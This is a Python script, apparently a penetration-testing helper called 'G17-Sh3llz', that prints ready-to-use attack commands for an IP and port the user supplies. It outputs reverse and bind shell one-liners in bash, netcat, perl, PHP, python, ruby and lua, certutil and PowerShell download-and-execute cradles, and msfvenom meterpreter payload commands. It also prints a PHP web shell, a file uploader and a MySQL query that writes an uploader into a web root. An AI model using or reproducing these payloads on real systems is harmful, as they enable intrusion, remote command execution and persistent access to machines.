#!/usr/bin/env python3

######################
# Created by Ph41ynX #
###################### 
# Shells collected from http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
# And https://guide.offsecnewbie.com/shells


import sys          # Used for system exit under main menu.
import ipaddress    # Used for IP Address validation and syntax.


# Color class is used for enhancing the visual effects of the program.
class c:
    k = '\033[90m'  # Black
    r = '\033[31m'  # Red
    b = '\033[91m'  # Bright Red
    g = '\033[92m'  # Bright Green
    d = '\033[32m'  # Dark Green
    y = '\033[93m'  # Bright Yellow
    o = '\033[33m'  # Dark Yellow
    a = '\033[94m'  # Bright Blue
    l = '\033[34m'  # Dark Blue
    p = '\033[35m'  # Dark Purple
    i = '\033[95m'  # Pink
    c = '\033[96m'  # Bright Cyan
    m = '\033[36m'  # Dark Cyan
    w = '\033[97m'  # Bright White
    n = '\033[0m'   # No Color


# The banner will be printed to the terminal after the start of the menu function.
banner = f"""{c.p}



     ::::::::    ::: :::::::::::                 ::::::::  :::    :::  ::::::::  :::        :::        ::::::::: 
    :+:    :+: :+:+: :+:     :+:                :+:    :+: :+:    :+: :+:    :+: :+:        :+:             :+:  
    +:+          +:+        +:+                 +:+        +:+    +:+        +:+ +:+        +:+            +:+   {c.w}
    :#:          +#+       +#+    +#++:++#++    +#++:++#++ +#++:++#++     +#++:  +#+        +#+           +#+    {c.d}
    +#+   +#+#   +#+      +#+                          +#+ +#+    +#+        +#+ +#+        +#+          +#+     
    #+#    #+#   #+#     #+#                    #+#    #+# #+#    #+# #+#    #+# #+#        #+#         #+#      
     ########  #######   ###                     ########  ###    ###  ########  ########## ########## ######### """

# The sub_banner will be printed to the terminal after the banner, once the menu function is called.
sub_banner = f"""{c.d}




                            {c.k}░░░░░░░░░░{c.d}          ███████]▄▄▄▄▄▄▄▄{c.k}--------{c.n}●
                                {c.k}░░░░░{c.d}      ▂▂▄▅█████████▅▄▃▂          
                                    {c.k}░░░░░{c.d}  ███████████████████].    {c.k}
                                      ░░░░░◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤..     
"""






def menu():                     # The menu function displays the banner, menu options, and validates user input from available options.
    print(banner + sub_banner)  # Prints the banner and sub_banner variables to the terminal.
    # The below print statement prints out the Linux Menu options to the terminal.
    print(f"{c.w}\nLinux Menu: \n\t1.{c.p} Bash\t\t\t    {c.w}2. {c.p}Java\t\t        {c.w}3. {c.p}Netcat\n\t{c.w}4. {c.p}Netcat Alt\t\t{c.w}    5. {c.p}Perl\t  {c.w}\t\t6. {c.p}PHP\n\t{c.w}7. {c.p}Python\t{c.w}\t    8. {c.p}Ruby\n{c.n}")
    # The below print statement prints out the Windows Menu options to the terminal.
    print(f"{c.w}\nWindows Menu: \n\t 9. {c.c}Certutil\t\t   {c.w}10. {c.c}Lua\t\t       {c.w}11. {c.c}Perl\n\t{c.w}12. {c.c}Powercat\t{c.w}\t   13. {c.c}Powershell\t {c.w}      14. {c.c}Python\n\t{c.w}15. {c.c}Ruby\n{c.n}")
    # The below print statement prints out the MSFVenom Menu options to the terminal.
    print(f"{c.w}\nMSFVenom Linux Menu: \n[x86]\n\t{c.w}16. {c.r}Meterpreter-Bind(S)\t   {c.w}17. {c.r}Meterpreter-Reverse(S)  {c.w}18. {c.r}Meterpreter-Reverse(SL)\n\t{c.w}19. {c.r}Shell-Reverse(SL)\t   {c.w}20. {c.r}Shell-Reverse(S)\t       {c.w}21. {c.r}Shell-Bind(SL)\t\t{c.w}\n\t22. {c.r}Shell-Bind(S)\n\n{c.n}")
    print(f"{c.w}\n[x64]\n\t{c.w}23. {c.r}Meterpreter-Bind(S)\t   {c.w}24. {c.r}Meterpreter-Reverse(S)  {c.w}25. {c.r}Meterpreter-Reverse(SL)\n\t{c.w}26. {c.r}Shell-Reverse(SL)\t   {c.w}27. {c.r}Shell-Reverse(S)\t{c.w}       28. {c.r}Shell-Bind(SL)\t\t\n\t{c.w}29. {c.r}Shell-Bind(S)\n\n{c.n}")
    print(f"{c.w}\nMSFVenom Windows Menu: \n\t{c.w}30. {c.l}Reverse Powershell\t   {c.w}31. {c.l}Reverse Lua\t       {c.w}32. {c.l}Reverse Perl\n\t{c.w}33. {c.l}Reverse Ruby\t   {c.w}34. {c.l}Bind Powershell\t       {c.w}35. {c.l}Bind Lua\n\t{c.w}36. {c.l}Bind Perl\t\t   {c.w}37. {c.l}Bind Ruby\n\n{c.n}")
    print(f"{c.w}\nMisc. Menu: \n\t{c.w}38. {c.m}War\t\t\t   {c.w}39. {c.m}Web Uploader\t       {c.w}40. {c.m}Web Shell\n\t{c.w}41. {c.m}MySQL Uploader\n\n\t\t\t\t      {c.w} 0. Exit{c.n}")
    u_input = input(f"{c.g}\nSelect an option{c.n}: ")        # User input for Menu Selection
    

    # The below statements evaluate the user's input and selects the cooresponding user entry.
    if u_input == "1":
        print(f"\n{c.p}Bash{c.w} selected!\n")
        ip_a, port_n = net()
        bash(ip_a, port_n)             
    elif u_input == "2":
        print(f"{c.p}Java{c.w} selected!\n")
        ip_a, port_n = net()
        java(ip_a, port_n)           
    elif u_input == "3":
        print(f"{c.p}Netcat{c.w} selected!\n")
        ip_a, port_n = net()
        netcat(ip_a, port_n)           
    elif u_input == "4":
        print(f"{c.p}Netcat{c.n} Alt selected!\n")
        ip_a, port_n = net()
        netcat_alt(ip_a, port_n)       
    elif u_input == "5":
        print(f"{c.p}Perl{c.n} selected!\n")
        ip_a, port_n = net()
        perl(ip_a, port_n)
    elif u_input == "6":
        print(f"{c.p}PHP{c.n} selected!\n")
        ip_a, port_n = net()
        php(ip_a, port_n)
    elif u_input == "7":
        print(f"{c.p}Python{c.n} selected!\n")
        ip_a, port_n = net()
        python(ip_a, port_n)
    elif u_input == "8":
        print(f"{c.p}Ruby{c.n} selected!\n")
        ip_a, port_n = net()
        ruby(ip_a, port_n)
    elif u_input == "9":
        print(f"{c.c}Certutil{c.n} selected!\n")
        ip_a, port_n = net()
        payload_set = payload_n()
        newPayload_set = newPayload_n()
        certutil(ip_a, port_n, payload_set, newPayload_set)          
    elif u_input == "10":
        print(f"{c.c}Lua{c.n} selected!\n")
        ip_a, port_n = net()
        lua(ip_a, port_n)           
    elif u_input == "11":
        print(f"{c.c}Perl{c.n} selected!\n")
        ip_a, port_n = net()
        perl_win(ip_a, port_n)           
    elif u_input == "12":
        print(f"{c.c}Powercat{c.n} selected!\n")
        ip_a, port_n = net()
        powercat(ip_a, port_n)       
    elif u_input == "13":
        print(f"{c.c}Powershell{c.n} selected!\n")
        ip_a, port_n = net()
        payload_set = payload_n()
        powershell(ip_a, port_n, payload_set)
    elif u_input == "14":
        print(f"{c.c}Python{c.n} selected!\n")
        ip_a, port_n = net()
        python_win(ip_a, port_n)
    elif u_input == "15":
        print(f"{c.c}Ruby{c.n} selected!\n")
        ip_a, port_n = net()
        ruby_win(ip_a, port_n)                 
    elif u_input == "16":
        print(f"{c.r}Meterpreter Bind TCP(Staged){c.n} selected!\n")
        ip_a, port_n = net()
        formats_set = msf_format()
        payload_set = payload_n()
        meterpreter_bind_s(ip_a, port_n, formats_set, payload_set)
    elif u_input == "17":
        print(f"{c.r}Meterpreter Reverse TCP(Staged){c.n} selected!\n")
        ip_a, port_n = net()
        formats_set = msf_format()
        payload_set = payload_n()
        meterpreter_reverse_s(ip_a, port_n, formats_set, payload_set)
    elif u_input == "18":
        print(f"{c.r}Meterpreter Reverse TCP(Stageless){c.n} selected!\n")
        ip_a, port_n = net()
        formats_set = msf_format()
        payload_set = payload_n()
        meterpreter_reverse_sl(ip_a, port_n, formats_set, payload_set)
    elif u_input == "19":
        print(f"{c.r}Shell Reverse TCP(Stageless){c.n} selected!\n")
        ip_a, port_n = net()
        formats_set = msf_format()
        payload_set = payload_n()
        shell_reverse_sl(ip_a, port_n, formats_set, payload_set)
    elif u_input == "20":
        print(f"{c.r}Shell Reverse TCP(Stageless){c.n} selected!\n")
        ip_a, port_n = net()
        formats_set = msf_format()
        payload_set = payload_n()
        shell_reverse_s(ip_a, port_n, formats_set, payload_set)
    elif u_input == "21":
        print(f"{c.r}Shell Bind TCP(Stageless){c.n} selected!\n")
        ip_a, port_n = net()
        formats_set = msf_format()
        payload_set = payload_n()
        shell_bind_sl(ip_a, port_n, formats_set, payload_set)
    elif u_input == "22":
        print(f"{c.r}Shell Bind TCP(Staged){c.n} selected!\n")
        ip_a, port_n = net()
        formats_set = msf_format()
        payload_set = payload_n()
        shell_bind_s(ip_a, port_n, formats_set, payload_set)
    elif u_input == "23":
        print(f"{c.r}Meterpreter Bind TCP(Staged x64) {c.n}selected!\n")
        ip_a, port_n = net()
        formats_set = msf_format()
        payload_set = payload_n()
        meterpreter_bind_s64(ip_a, port_n, formats_set, payload_set)
    elif u_input == "24":
        print(f"{c.r}Meterpreter Reverse TCP(Staged x64) {c.n}selected!\n")
        ip_a, port_n = net()
        formats_set = msf_format()
        payload_set = payload_n()
        meterpreter_reverse_s64(ip_a, port_n, formats_set, payload_set)
    elif u_input == "25":
        print(f"{c.r}Meterpreter Reverse TCP(Stageless x64) {c.n}selected!\n")
        ip_a, port_n = net()
        formats_set = msf_format()
        payload_set = payload_n()
        meterpreter_reverse_sl64(ip_a, port_n, formats_set, payload_set)
    elif u_input == "26":
        print(f"{c.r}Shell Reverse TCP(Stageless x64) {c.n}selected!\n")
        ip_a, port_n = net()
        formats_set = msf_format()
        payload_set = payload_n()
        shell_reverse_sl64(ip_a, port_n, formats_set, payload_set)
    elif u_input == "27":
        print(f"{c.r}Shell Reverse TCP(Stageless x64) {c.n}selected!\n")
        ip_a, port_n = net()
        formats_set = msf_format()
        payload_set = payload_n()
        shell_reverse_s64(ip_a, port_n, formats_set, payload_set)
    elif u_input == "28":
        print(f"{c.r}Shell Bind TCP(Stageless x64) {c.n}selected!\n")
        ip_a, port_n = net()
        formats_set = msf_format()
        payload_set = payload_n()
        shell_bind_sl64(ip_a, port_n, formats_set, payload_set)
    elif u_input == "29":
        print(f"{c.r}Shell Bind TCP(Staged x64) {c.n}selected!\n")
        ip_a, port_n = net()
        formats_set = msf_format()
        payload_set = payload_n()
        shell_bind_s64(ip_a, port_n, formats_set, payload_set)
    elif u_input == "30":
        print(f"{c.l}MSFVenom Reverse Powershell{c.n} selected!\n")
        ip_a, port_n = net()
        formats_set = msf_format()
        payload_set = payload_n()
        msfvenom_powershell(ip_a, port_n, formats_set, payload_set)
    elif u_input == "31":
        print(f"{c.l}MSFVenom Reverse Lua{c.n} selected!\n")
        ip_a, port_n = net()
        formats_set = msf_format()
        payload_set = payload_n()
        msfvenom_lua(ip_a, port_n, formats_set, payload_set)
    elif u_input == "32":
        print(f"{c.l}MSFVenom Reverse Perl{c.n} selected!\n")
        ip_a, port_n = net()
        formats_set = msf_format()
        payload_set = payload_n()
        msfvenom_perl(ip_a, port_n, formats_set, payload_set)
    elif u_input == "33":
        print(f"{c.l}MSFVenom Reverse Ruby{c.n} selected!\n")
        ip_a, port_n = net()
        formats_set = msf_format()
        payload_set = payload_n()
        msfvenom_ruby(ip_a, port_n, formats_set, payload_set)
    elif u_input == "34":
        print(f"{c.l}MSFVenom Bind Powershell{c.n} selected!\n")
        ip_a, port_n = net()
        formats_set = msf_format()
        payload_set = payload_n()
        msfvenom_psB(ip_a, port_n, formats_set, payload_set)
    elif u_input == "35":
        print(f"{c.l}MSFVenom Bind Lua{c.n} selected!\n")
        ip_a, port_n = net()
        formats_set = msf_format()
        payload_set = payload_n()
        msfvenom_luaB(ip_a, port_n, formats_set, payload_set)
    elif u_input == "36":
        print(f"{c.l}MSFVenom Bind Perl{c.n} selected!\n")
        ip_a, port_n = net()
        formats_set = msf_format()
        payload_set = payload_n()
        msfvenom_perlB(ip_a, port_n, formats_set, payload_set)
    elif u_input == "37":
        print(f"{c.l}MSFVenom Bind Ruby{c.n} selected!\n")
        ip_a, port_n = net()
        formats_set = msf_format()
        payload_set = payload_n()
        msfvenom_rubyB(ip_a, port_n, formats_set, payload_set)
    elif u_input == "38":
        print(f"{c.m}War{c.n} selected!\n")
        ip_a, port_n = net()
        payload_set = payload_n()
        war(ip_a, port_n, payload_set)
    elif u_input == "39":
        print(f"{c.m}Web Uploader{c.n} selected!\n")
        web_uploader()
    elif u_input == "40":
        print(f"{c.m}Web Shell{c.n} selected!\n")
        web_shell()
    elif u_input == "41":
        print(f"{c.m}MySQL Uploader{c.n} selected!\n")
        mysql_uploader()
    elif u_input == "0":                                                            # Exits the program when option 0 is selected.
        print(f"{c.w}\nThank you for using {c.p}G17-Sh3llz{c.g}... {c.w}Goodbye!{c.n}")    
        sys.exit()
    else:                                                                           # Produces error for invalid user input.
        print(f"\n{c.r}[-] {c.y}That's not a valid option!\n{c.r}[-] {c.y}Please choose again!\n\n\n{c.n}")
        menu()



def net():
    while True:                                                                     # While the bash function is still running it will come back as a true value and loop.
        try:
            ip = ipaddress.IPv4Address((input(f"{c.a}\nEnter Your IP{c.n}: ").replace(" ","")))   # Provides IP Address validation to insure that an IPv4 address is being used and nothing else.
            port = int(input(f"{c.a}Enter a port number{c.n}: "))                 # Forces a whole number to be used, still missing port# validation.
            return ip, port

        except ValueError:                                                          # VauleError handling will loop back to entering the IP Address, if invalid input is detected from IP or port#.
            print(f"{c.r}[-] {c.y}Invaild (IPv4 Address), or (Port Number) entered!")
            print(f"{c.r}[-] {c.y}Syntax: IP: 192.168.1.1 Port#: 1 - 65535\n")


def payload_n():                                                                               # Function used for payloads that require a file name in the syntax
    while True:
        try:
            payload = str(input(f"{c.a}Enter a payload file name{c.n}: ").replace(" ",""))     # Removes spaces within any file names given.
            if not payload:
                raise ValueError('empty string')
            return payload                                                                     # Raises ValueError for missing input.

        except ValueError:
            print(f"{c.r}[-] {c.y}You must specifiy a valid payload name!")                    # Displays error if no filename is given and starts function over again.
            print(f"{c.r}[-] {c.y}Syntax: exploit.ps1\n")


def newPayload_n():                                                                            # Functionsed for renaming payloads that allow an option to rename.
    while True:
        try:
            newPayload = str(input(f"{c.a}Enter a new payload file name{c.n}: ").replace(" ",""))
            if not newPayload:
                raise ValueError('empty string')
            return newPayload

        except ValueError:
            print(f"{c.r}[-] {c.y}You must specifiy a valid payload name!")
            print(f"{c.r}[-] {c.y}Syntax: exploit.bat\n")


def msf_format():                                                                              # Function used to set MSFVenom format, allowing for further customization of payload options
    while True:
        try:
            print(f"\n\n{c.r}MSFVenom Supported Formats:")
            print(f"""{c.w}asp,  aspx,  aspx-exe,  axis2, dll,  elf,  elf-so,  exe,  exe-only,  exe-service,  exe-small,  hta-psh,  jar,\njsp,  loop-vbs,  macho,  msi,  msi-novac,  osx-app,  psh,  psh-cmd,  psh-net,  psh-reflection,  python-reflection,\nvba,  vba-exe,  vba-psh,  vbs,  war,  base32,  base64,  bash,  c,  csharp,  dw,  dword,  hex,  java,  js_be,  js_le,\nnum,  perl,  pl,  powershell,  ps1,  py,  python,  raw,  rb,  ruby,  sh,  vbapplication,  vbscript\n\n""")
            formats = str(input(f"{c.a}Enter a format option{c.n}: ").replace(" ",""))
            if not formats:
                raise ValueError('empty string')
            return formats
        
        except ValueError:
            print(f"{c.r}[-] {c.y}You must specifiy a valid MSFVenom format")
            print(f"{c.r}[-] {c.y}eg: raw\n")


def web_extensions():
    while True:
        try:
            print(f"\n\n{c.m}Web Extensions:")
            print(f"{c.w}Extension file name examples: {c.m}html, jsp, php, php3, php5, pht{c.n}\n")
            extension = str(input(f"{c.a}Enter an extension file name{c.n}: ").replace(" ",""))
            if not extension:
                raise ValueError('empty string')
            return extension

        except ValueError:
            print(f"{c.r}[-] {c.y}You must specifiy an extension type!")
            print(f"{c.r}[-] {c.y}eg: php3, pht, or html\n")



# Begin Linux Menu Functions.
def bash(ip, port):
    print(f"\n{c.g}[+] {c.p}bash -i >& /dev/tcp/{ip}/{port} 0>&1{c.n}\n")            # Syntax output for Bash reverse shell.
    exit(0)                                                                 # Conducts a clean exit of the program.
                    
        
def java(ip, port):
    print(f"""\n{c.g}[+] {c.p}r = Runtime.getRuntime()""")
    print(f"""{c.g}[+] {c.p}p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])""")
    print(f"{c.g}[+] {c.p}p.waitFor(){c.n}\n")
    exit(0)


def netcat(ip, port):
    print(f"""\n{c.g}[+] {c.p}nc -e /bin/sh {ip} {port}{c.n}\n""")
    exit(0)


def netcat_alt(ip, port):
    print(f"""\n{c.g}[+] {c.p}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f{c.n}\n""")
    exit(0)


def perl(ip, port):
    print(f"""\n{c.g}[+] {c.p}perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'{c.n}\n""")
    exit(0)


def php(ip, port):
    print(f"""\n{c.g}[+] {c.p}php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'{c.n}\n""")
    exit(0)


def python(ip, port):
    print(f"""\n{c.g}[+] {c.p}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'{c.n}\n""")
    exit(0)


def ruby(ip, port):
    print(f"""\n{c.g}[+] {c.p}ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'{c.n}\n""")
    exit(0)


# Start of Window's Menu Functions.
def certutil(ip, port, payload, newPayload):
    print(f"""\n{c.g}[+] {c.c}certutil -urlcache -split -f http://{ip}:{port}/{payload} {newPayload}{c.n}\n""")
    exit(0)


def lua(ip, port):
    print(f"""\n{c.g}[+] {c.c}lua5.1 -e 'local host, port = "{ip}", {port} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'{c.n}\n""")
    exit(0)


def perl_win(ip, port):
    print(f"""\n{c.g}[+] {c.c}perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'{c.n}\n""")
    exit(0)


def powercat(ip, port):
    print(f"""\n{c.g}[+] {c.c}powercat -c {ip} -p {port} -e cmd{c.n}\n""")
    exit(0)


def powershell(ip, port, payload):
    print(f"""\n{c.g}[+] {c.c}powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://{ip}:{port}/{payload}')" {c.n}\n""")
    exit(0)


def python_win(ip, port):
    print(f"""\n{c.g}[+] {c.c}C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('{ip}', {port})), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {{'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])}})(), type('try', (), {{'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]}})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\\\windows\\\\system32\\\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({{}}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({{}}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib')){c.n}\n""")
    exit(0)


def ruby_win(ip, port):  
    print(f"""\n{c.g}[+] {c.c}ruby -rsocket -e 'c=TCPSocket.new("{ip}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end'{c.n}\n""")
    exit(0)


# Start of MSFVenom Linux x86 functions.
def meterpreter_bind_s(ip, port, formats, payload):
    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x86/meterpreter/bind_tcp LHOST={ip} LPORT={port} -f {formats} > {payload}{c.n}\n""")
    exit(0)


def meterpreter_reverse_s(ip, port, formats, payload):
    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f {formats} > {payload}{c.n}\n""")
    exit(0)


def meterpreter_reverse_sl(ip, port, formats, payload):
    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f {formats} > {payload}{c.n}\n""")
    exit(0)


def shell_reverse_sl(ip, port, formats, payload):
    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x86/shell_reverse_tcp LHOST={ip} LPORT={port} -f {formats} > {payload}{c.n}\n""")
    exit(0)


def shell_reverse_s(ip, port, formats, payload):
    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x86/shell/reverse_tcp LHOST={ip} LPORT={port} -f {formats} > {payload}{c.n}\n""")
    exit(0)


def shell_bind_sl(ip, port, formats, payload):
    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x86/shell_bind_tcp LHOST={ip} LPORT={port} -f {formats} > {payload}{c.n}\n""")
    exit(0)


def shell_bind_s(ip, port, formats, payload):
    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x86/shell/bind_tcp LHOST={ip} LPORT={port} -f {formats} > {payload}{c.n}\n""")
    exit(0)


# Start of MSFVenom Linux x86_64 functions.
def meterpreter_bind_s64(ip, port, formats, payload):
    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x64/meterpreter/bind_tcp LHOST={ip} LPORT={port} -f {formats} > {payload} {c.n}\n""")
    exit(0)


def meterpreter_reverse_s64(ip, port, formats, payload):
    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f {formats} > {payload} {c.n}\n""")
    exit(0)


def meterpreter_reverse_sl64(ip, port, formats, payload):
    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f {formats} > {payload} {c.n}\n""")
    exit(0)


def shell_reverse_sl64(ip, port, formats, payload):
    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f {formats} > {payload} {c.n}\n""")
    exit(0)


def shell_reverse_s64(ip, port, formats, payload):
    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x64/shell/reverse_tcp LHOST={ip} LPORT={port} -f {formats} > {payload} {c.n}\n""")
    exit(0)


def shell_bind_sl64(ip, port, formats, payload):
    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x64/shell_bind_tcp LHOST={ip} LPORT={port} -f {formats} > {payload} {c.n}\n""")
    exit(0)


def shell_bind_s64(ip, port, formats, payload):
    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x64/shell/bind_tcp LHOST={ip} LPORT={port} -f {formats} > {payload} {c.n}\n""")
    exit(0)


# Start of MSFVenom Windows functions
def msfvenom_powershell(ip, port, formats, payload):
    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x64/meterpreter/ LHOST={ip} LPORT={port} -f {formats} > {payload} {c.n}\n""")
    exit(0)


def msfvenom_lua(ip, port, formats, payload):
    print(f"""\n{c.g}[+] {c.l}msfvenom -p cmd/windows/reverse_lua LHOST={ip} LPORT={port} -f {formats} > {payload} {c.n}\n""")
    exit(0)


def msfvenom_perl(ip, port, formats, payload):
    print(f"""\n{c.g}[+] {c.l}msfvenom -p cmd/windows/reverse_perl LHOST={ip} LPORT={port} -f {formats} > {payload} {c.n}\n""")
    exit(0)


def msfvenom_ruby(ip, port, formats, payload):
    print(f"""\n{c.g}[+] {c.l}msfvenom -p cmd/windows/reverse_ruby LHOST={ip} LPORT={port} -f {formats} > {payload} {c.n}\n""")
    exit(0)


def msfvenom_psB(ip, port, formats, payload):
    print(f"""\n{c.g}[+] {c.l}msfvenom -p cmd/windows/powershell_bind_tcp LHOST={ip} LPORT={port} -f {formats} > {payload} {c.n}\n""")
    exit(0)


def msfvenom_luaB(ip, port, formats, payload):
    print(f"""\n{c.g}[+] {c.l}msfvenom -p cmd/windows/bind_lua LHOST={ip} LPORT={port} -f {formats} > {payload} {c.n}\n""")
    exit(0)

def msfvenom_perlB(ip, port, formats, payload):
    print(f"""\n{c.g}[+] {c.l}msfvenom -p cmd/windows/bind_perl LHOST={ip} LPORT={port} -f {formats} > {payload} {c.n}\n""")
    exit(0)


def msfvenom_rubyB(ip, port, formats, payload):
    print(f"""\n{c.g}[+] {c.l}msfvenom -p cmd/windows/bind_ruby LHOST={ip} LPORT={port} -f {formats} > {payload} {c.n}\n""")
    exit(0)


# Start of Misc. Menu Functions
def war(ip, port, payload):
    print(f"""\n{c.g}[+] {c.m}msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f war > {payload}.war{c.n}\n""")
    exit(0)


def web_uploader():
    print(f"""{c.g}[+] {c.m}<!DOCTYPE html>
<html>
<head>
  <title>Upload your files</title>
</head>
<body>
  <form enctype="multipart/form-data" action="upload.php" method="POST">
    <p>Upload your file</p>
    <input type="file" name="uploaded_file"></input><br />
    <input type="submit" value="Upload"></input>
  </form>
</body>
</html>
<?PHP
  if(!empty($_FILES['uploaded_file']))
  {{
    $path = "uploads/";
    $path = $path . basename( $_FILES['uploaded_file']['name']);

    if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) {{
      echo "The file ".  basename( $_FILES['uploaded_file']['name']). 
      " has been uploaded";
    }} else{{
        echo "There was an error uploading the file, please try again!";
    }}
  }}
?>{c.n}\n""")
    exit(0)


def web_shell():
    print(f"""\n{c.g}[+] {c.m}<?php system($_GET['cmd']); ?>{c.n}\n""")
    exit(0)


def mysql_uploader():
    print(f"""{c.g}[+] {c.m}SELECT\n"<?php echo \\'<form action=\\"\\" method=\\"post\\" enctype=\\"multipart/form-data\\" name=\\"uploader\\" id=\\"uploader\\">\\';echo \\'<input type=\\"file\\" name=\\"file\\" size=\\"50\\"><input name=\\"_upl\\" type=\\"submit\\" id=\\"_upl\\" value=\\"Upload\\"><form>\\'; $_upl = @$_POST[\\'_upl\\']; if(isset($_upl)) {{if(@copy($_FILES[\\'file\\'][\\'tmp_name\\'], $_FILES[\\'file\\'][\\'name\\'])) {{ echo \\'<b>Upload Done<b><br><br>\\'; }}else {{echo \\'<b>Upload Failed</b><br><br>\\';}}?>"\nINTO OUTFILE 'C:/var/www/html/uploader.php';{c.n}\n""")
    exit(0)


menu() # Initializes the program and calls the Menu Function when the program starts.
